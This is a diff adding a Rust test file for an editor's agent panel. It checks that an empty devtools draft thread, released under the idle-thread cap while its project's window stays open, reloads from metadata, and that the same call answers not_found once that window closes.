+++ b/crates/agent_ui/src/browser_channel_tests/devtools_threads_idle_reload.rs
@@ -0,0 +1,337 @@
+// Story 055, task 18.2 (refine v4) — an empty devtools draft the agent panel released under its
+// idle cap while its project's window stays open is reloaded from its metadata, not answered
+// `not_found` (design.md §B3 "Empty thread gone with its window", v4 bullet). Requirements:
+// R5.11, R5.9 (Q4, Q5). Found by 18.1's deviation: the v3 rule ("no persisted row and no live
+// entity") is window-independent, so a draft `cleanup_retained_threads` released in a window that
+// is still open answered `not_found` and the panel dropped a thread that still exists.
+//
+// An ADDITIONAL test file beside 18.1's `browser_channel_tests/devtools_threads_reopen.rs` (left
+// untouched; its seven cases must stay green). Wired INSIDE `src/browser_channel.rs` right after
+// `devtools_threads_reopen`, to reach the private `test_support`, so the test path matches the
+// Validation filter `cargo test -p agent_ui devtools_threads`:
+//
+//     #[cfg(test)]
+//     #[path = "browser_channel_tests/devtools_threads_idle_reload.rs"]
+//     mod devtools_threads_idle_reload;
+//
+// Contract (design.md §B3, v3 + v4): `ensure_loaded(thread_id, cx)` answers
+// `DevtoolsThreadError::NotFound` for a marked devtools thread with no persisted mark, no session
+// and no live conversation entity ONLY when no open window holds its project (B2's containment
+// rule). With a window open on the project, such a draft takes the reload-from-metadata path it
+// took before v3 (R5.11) and answers its thread.
+//
+// The release is driven the way Zeo does it: `max_idle_retained_threads` lowered in the settings
+// (the agent panel's settings observer runs `cleanup_retained_threads`, which calls
+// `remove_retained_thread`), then restored so the reloaded view is not released again while the
+// test reads it. The agent connection supports `load_session`, or the panel never releases a
+// thread. Every case first asserts the release really happened (no view in any panel, no session),
+// so a green or a red here is about `ensure_loaded`, not about the eviction.
+//
+// Hostile halves first (R5.9 vs R5.11 split ONE kind of thread — empty, unpromoted, no view — by
+// one fact: whether an open window holds its project; both converses):
+//   - wrongly collapsed: an empty draft released in an open window and an empty draft whose window
+//     closed look identical to the v3 check; they MUST stay apart (ok vs not_found). And another
+//     project's open window does not make a closed project's released draft loadable — "any window
+//     open" is not "its project's window open";
+//   - wrongly split: in the same open window, the released draft answers the SAME as its live
+//     sibling (ok) — "released" must not become a third outcome;
+//   - only then the benign case.
+
+use std::time::Duration;
+
+use acp_thread::StubAgentConnection;
+use gpui::{TestAppContext, UpdateGlobal as _};
+use settings::SettingsStore;
+
+use super::test_support::*;
+use crate::browser_wire::ChannelError;
+use crate::devtools_threads::{CONNECT_TIMEOUT, DevtoolsThreadError};
+use crate::thread_metadata_store::{ThreadId, ThreadMetadataStore};
+
+mod seam {
+    use std::path::Path;
+
+    use anyhow::Result;
+    use gpui::TestAppContext;
+
+    use crate::browser_wire::ThreadInfo;
+
+    pub async fn create(root: &str, cx: &mut TestAppContext) -> Result<ThreadInfo> {
+        let task = cx.update(|cx| crate::devtools_threads::create(Path::new(root), cx));
+        cx.run_until_parked();
+        task.await
+    }
+
+    pub fn is_devtools_of(thread_id: &str, root: &str, cx: &mut TestAppContext) -> bool {
+        cx.update(|cx| crate::devtools_threads::is_devtools_of(thread_id, Path::new(root), cx))
+    }
+
+    /// `ensure_loaded`, settled: past [`crate::devtools_threads::CONNECT_TIMEOUT`] a load still
+    /// connecting has answered too, so the result is always decided when this returns.
+    pub async fn ensure_loaded(thread_id: &str, cx: &mut TestAppContext) -> Result<()> {
+        let task = cx.update(|cx| crate::devtools_threads::ensure_loaded(thread_id, cx));
+        cx.run_until_parked();
+        cx.executor()
+            .advance_clock(super::CONNECT_TIMEOUT + super::Duration::from_secs(1));
+        cx.run_until_parked();
+        task.await
+    }
+}
+
+/// An agent whose threads the agent panel may release when idle: it only releases a thread it can
+/// load back (`supports_load_session`).
+fn releasable() -> StubAgentConnection {
+    StubAgentConnection::new().with_supports_load_session(true)
+}
+
+/// What `ensure_loaded` answered, as the wire's code for it, with the error's text for messages.
+fn outcome(result: &anyhow::Result<()>) -> (&'static str, String) {
+    match result {
+        Ok(()) => ("ok", String::new()),
+        Err(error) => {
+            let text = format!("{error:#}");
+            let code = match error.downcast_ref::<DevtoolsThreadError>() {
+                Some(DevtoolsThreadError::NotFound { .. }) => "not_found",
+                Some(DevtoolsThreadError::ProjectClosed { .. }) => "project_closed",
+                Some(DevtoolsThreadError::AgentStartFailed { .. }) => "agent_start_failed",
+                None => "other",
+            };
+            (code, text)
+        }
+    }
+}
+
+fn assert_answers_its_thread(result: &anyhow::Result<()>, what: &str) {
+    let (code, text) = outcome(result);
+    assert_eq!(
+        code, "ok",
+        "R5.11: {what} is reloaded from its metadata and answers its thread; answered {code} ({text})"
+    );
+}
+
+fn assert_not_found(result: &anyhow::Result<()>, what: &str) {
+    let (code, text) = outcome(result);
+    assert_eq!(code, "not_found", "R5.9: {what}; answered {code} ({text})");
+    let error = result.as_ref().expect_err("an error");
+    let channel = error
+        .downcast_ref::<DevtoolsThreadError>()
+        .map(DevtoolsThreadError::channel_error);
+    assert_eq!(
+        channel,
+        Some(ChannelError::NotFound),
+        "the panel reads `error not_found` (R5.8): {what}"
+    );
+}
+
+fn thread_id_of(key: &str, cx: &mut TestAppContext) -> ThreadId {
+    cx.update(|cx| {
+        ThreadMetadataStore::global(cx)
+            .read(cx)
+            .entry_ids()
+            .find(|id| id.to_key_string() == key)
+            .unwrap_or_else(|| panic!("{key} is a known thread"))
+    })
+}
+
+/// Whether the agent panel of `win` holds a view for `key`: the active one, a retained one or the
+/// draft slot.
+fn held(win: &Win, key: &str) -> bool {
+    win.panel.read_with(&win.cx, |panel, cx| {
+        ThreadMetadataStore::global(cx)
+            .read(cx)
+            .entry_ids()
+            .find(|id| id.to_key_string() == key)
+            .is_some_and(|id| panel.conversation_view_for(id, cx).is_some())
+    })
+}
+
+/// Whether `key`'s metadata is still a draft: no session, the first message never went out.
+fn is_draft(key: &str, cx: &mut TestAppContext) -> bool {
+    let id = thread_id_of(key, cx);
+    cx.update(|cx| {
+        ThreadMetadataStore::global(cx)
+            .read(cx)
+            .entry(id)
+            .is_some_and(|entry| entry.is_draft())
+    })
+}
+
+/// Sets `agent.max_idle_retained_threads` the way the operator's settings do; the agent panel's
+/// settings observer runs `cleanup_retained_threads` on every change.
+fn set_idle_cap(cap: Option<usize>, cx: &mut TestAppContext) {
+    let json = match cap {
+        Some(cap) => format!(r#"{{ "agent": {{ "max_idle_retained_threads": {cap} }} }}"#),
+        None => "{}".to_string(),
+    };
+    cx.update(|cx| {
+        SettingsStore::update_global(cx, |store, cx| {
+            store
+                .set_user_settings(&json, cx)
+                .expect("user settings should load");
+        });
+    });
+    cx.run_until_parked();
+}
+
+/// Lowers the idle cap to `cap` (the agent panel releases its oldest idle threads beyond it), then
+/// restores the default so a thread loaded afterwards is not released again mid-test.
+fn release_idle_beyond(cap: usize, cx: &mut TestAppContext) {
+    set_idle_cap(Some(cap), cx);
+    set_idle_cap(None, cx);
+}
+
+/// Closes `win` the way closing the project's window does, and lets go of every handle the test
+/// held on it.
+fn close(win: Win, cx: &mut TestAppContext) {
+    let mut win = win;
+    win.cx.update(|window, _| window.remove_window());
+    win.cx.run_until_parked();
+    drop(win);
+    cx.run_until_parked();
+}
+
+// ---- hostile: wrongly collapsed — released-with-window-open vs gone-with-window -----------------
+
+#[gpui::test]
+async fn hostile_a_draft_released_in_an_open_window_and_a_draft_gone_with_its_window_stay_apart(
+    cx: &mut TestAppContext,
+) {
+    init(cx);
+    let fs = shared_fs(cx).await;
+    let app = window(&fs, "/p/app", Some(releasable()), cx).await;
+    let web = window(&fs, "/p/web", Some(releasable()), cx).await;
+    let gone = seam::create("/p/app", cx).await.expect("created in /p/app");
+    let released = seam::create("/p/web", cx).await.expect("created in /p/web");
+    assert!(
+        held(&web, &released.thread_id),
+        "precondition: created and held"
+    );
+
+    release_idle_beyond(0, cx);
+    close(app, cx);
+
+    // Precondition: to the v3 check both are the same thing — empty, unpromoted, no view.
+    assert!(
+        !held(&web, &released.thread_id),
+        "precondition: the idle cap released the /p/web draft while its window stays open"
+    );
+    assert!(is_draft(&released.thread_id, cx) && is_draft(&gone.thread_id, cx));
+
+    let released_result = seam::ensure_loaded(&released.thread_id, cx).await;
+    assert_answers_its_thread(
+        &released_result,
+        "the empty draft the idle cap released while /p/web's window stays open",
+    );
+    assert!(
+        held(&web, &released.thread_id),
+        "R5.11: reloaded into its project's window"
+    );
+    assert!(seam::is_devtools_of(&released.thread_id, "/p/web", cx));
+
+    let gone_result = seam::ensure_loaded(&gone.thread_id, cx).await;
+    assert_not_found(
+        &gone_result,
+        "the empty draft whose project has no open window (another project's window is open)",
+    );
+}
+
+#[gpui::test]
+async fn hostile_a_draft_released_while_open_is_not_found_once_its_window_closes_too(
+    cx: &mut TestAppContext,
+) {
+    init(cx);
+    let fs = shared_fs(cx).await;
+    let app = window(&fs, "/p/app", Some(releasable()), cx).await;
+    let _web = window(&fs, "/p/web", Some(releasable()), cx).await;
+    let draft = seam::create("/p/app", cx).await.expect("created in /p/app");
+
+    // Released first, while /p/app's window was open; then the project closes. Having once been
+    // released does not make it loadable for ever: no window holds its project any more.
+    release_idle_beyond(0, cx);
+    assert!(
+        !held(&app, &draft.thread_id),
+        "precondition: the idle cap released the draft"
+    );
+    close(app, cx);
+
+    let result = seam::ensure_loaded(&draft.thread_id, cx).await;
+    assert_not_found(
+        &result,
+        "an empty draft released by the idle cap whose project then closed",
+    );
+}
+
+// ---- hostile: wrongly split — released and live siblings in one open window, one answer ---------
+
+#[gpui::test]
+async fn hostile_a_released_draft_answers_like_its_live_sibling_in_the_same_window(
+    cx: &mut TestAppContext,
+) {
+    init(cx);
+    let fs = shared_fs(cx).await;
+    let app = window(&fs, "/p/app", Some(releasable()), cx).await;
+    let first = seam::create("/p/app", cx).await.expect("first");
+    cx.executor().advance_clock(Duration::from_secs(1));
+    let second = seam::create("/p/app", cx).await.expect("second");
+
+    // A cap of one releases exactly one of the two idle drafts; which one is the panel's choice.
+    release_idle_beyond(1, cx);
+    let first_held = held(&app, &first.thread_id);
+    let second_held = held(&app, &second.thread_id);
+    assert!(
+        first_held != second_held,
+        "precondition: the cap of one released exactly one draft (first held {first_held}, \
+         second held {second_held})"
+    );
+    let (live, released) = if first_held {
+        (first, second)
+    } else {
+        (second, first)
+    };
+
+    let live_result = seam::ensure_loaded(&live.thread_id, cx).await;
+    assert_answers_its_thread(&live_result, "the live draft");
+    let released_result = seam::ensure_loaded(&released.thread_id, cx).await;
+    assert_answers_its_thread(
+        &released_result,
+        "its sibling the idle cap released, same window, same project",
+    );
+    assert!(held(&app, &released.thread_id), "R5.11: reloaded");
+    assert!(seam::is_devtools_of(&released.thread_id, "/p/app", cx));
+}
+
+// ---- benign -------------------------------------------------------------------------------------
+
+#[gpui::test]
+async fn an_empty_draft_the_idle_cap_released_reloads_while_its_window_is_open(
+    cx: &mut TestAppContext,
+) {
+    init(cx);
+    let fs = shared_fs(cx).await;
+    let app = window(&fs, "/p/app", Some(releasable()), cx).await;
+    let shown = app.thread().entity_id();
+    let draft = seam::create("/p/app", cx).await.expect("created");
+
+    release_idle_beyond(0, cx);
+    assert!(
+        !held(&app, &draft.thread_id),
+        "precondition: the idle cap released the draft"
+    );
+    assert!(
+        is_draft(&draft.thread_id, cx),
+        "precondition: never sent a message"
+    );
+
+    let result = seam::ensure_loaded(&draft.thread_id, cx).await;
+    assert_answers_its_thread(&result, "the released empty draft");
+    assert!(
+        held(&app, &draft.thread_id),
+        "R5.11: reloaded into its window"
+    );
+    assert!(seam::is_devtools_of(&draft.thread_id, "/p/app", cx));
+    assert_eq!(
+        app.thread().entity_id(),
+        shown,
+        "R5.6 / A2: reloading does not change the thread the editor shows"
+    );
+}
